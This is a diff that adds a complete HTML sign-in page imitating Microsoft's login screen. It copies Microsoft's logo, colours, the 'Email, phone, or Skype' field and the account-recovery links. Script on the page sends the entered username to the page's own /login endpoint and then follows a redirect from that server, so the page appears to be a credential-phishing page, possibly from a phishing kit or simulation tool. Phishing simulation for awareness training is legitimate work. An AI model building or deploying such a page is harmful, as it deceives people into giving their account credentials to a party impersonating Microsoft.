@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in</title>
+
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Roboto, Arial, sans-serif;
+
+            background: url("/static/background.svg") center/cover no-repeat;
+        }
+
+        /* wrapper */
+
+        .login-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* login card */
+
+        .login-box {
+
+            width: 440px;
+
+            background: white;
+
+            padding: 44px;
+
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        /* logo */
+
+        .logo {
+            width: 108px;
+            margin-bottom: 16px;
+        }
+
+        /* title */
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0 0 20px 0;
+        }
+
+        /* input */
+
+        input {
+
+            width: 100%;
+
+            border: none;
+            border-bottom: 1px solid #666;
+
+            font-size: 15px;
+
+            padding: 6px 0;
+
+            margin-bottom: 20px;
+
+            outline: none;
+        }
+
+        input:focus {
+            border-bottom: 2px solid #0067b8;
+        }
+
+        /* links */
+
+        .links {
+            font-size: 13px;
+            margin-bottom: 10px;
+        }
+
+        .links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        /* button */
+
+        .actions {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 18px;
+        }
+
+        button {
+
+            background: #0067b8;
+
+            border: none;
+
+            color: white;
+
+            padding: 8px 45px;
+
+            font-size: 15px;
+
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #005da6;
+        }
+
+        /* bottom card */
+
+        .login-options {
+
+            margin-top: 20px;
+
+            width: -moz-available;
+
+            background: white;
+
+            padding: 12px 20px;
+
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+
+            display: flex;
+
+            align-items: center;
+
+            gap: 12px;
+
+            font-size: 14px;
+        }
+
+        .login-options img {
+            width: 18px;
+        }
+
+        .error-message {
+            color: #e53935;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .input-group input {
+            width: 100%;
+            border: none;
+            border-bottom: 2px solid #ccc;
+            padding: 10px 5px;
+            font-size: 15px;
+            outline: none;
+        }
+
+        .input-group input.error {
+            border-bottom: 2px solid #e53935;
+        }
+
+        .d-none {
+            display: none;
+        }
+    </style>
+
+</head>
+
+<body>
+
+    <div class="login-wrapper">
+
+        <div class="login-box">
+
+            <img class="logo" src="/static/microsoft_logo.svg">
+
+            <h1>Sign in</h1>
+            <form id="login-form" method="POST" action="/login">
+                <div id="error-message" class="error-message d-none">
+                    The password is incorrect. Please try again.
+                </div>
+                <div class="input-group">
+                    <input type="text" id="username-input" name="username" placeholder="Email, phone, or Skype">
+                </div>
+                <div class="links">
+                    No account? <a href="#">Create one!</a>
+                </div>
+
+                <div class="links">
+                    <a href="#">Can't access your account?</a>
+                </div>
+
+                <div class="actions">
+                    <button type="submit">Next</button>
+                </div>
+            </form>
+
+        </div>
+
+        <div class="login-options">
+
+            <img src="/static/signin-options.svg">
+
+            <span>Sign-in options</span>
+
+        </div>
+
+    </div>
+
+    <script>
+
+        const form = document.getElementById('login-form');
+        const errorDiv = document.getElementById('error-message');
+        const usernameInput = document.getElementById('username-input');
+
+        form.addEventListener('submit', async (e) => {
+
+            e.preventDefault();
+            usernameInput.classList.remove("error");
+            errorDiv.classList.add("d-none");
+
+            const formData = new URLSearchParams();
+
+            for (const [key, value] of new FormData(form)) {
+                formData.append(key, value);
+            }
+
+            const response = await fetch(form.action, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: formData.toString(),
+            });
+
+            const data = await response.json();
+
+            if (data.redirect) {
+                window.location.href = data.redirect;
+                return;
+            }
+
+            if (!data.success) {
+
+                errorDiv.textContent = data.error || "Login failed.";
+
+                usernameInput.classList.add("error");
+                errorDiv.classList.remove("d-none");
+            }
+
+        });
+
+    </script>
+
+</body>
+
+</html>
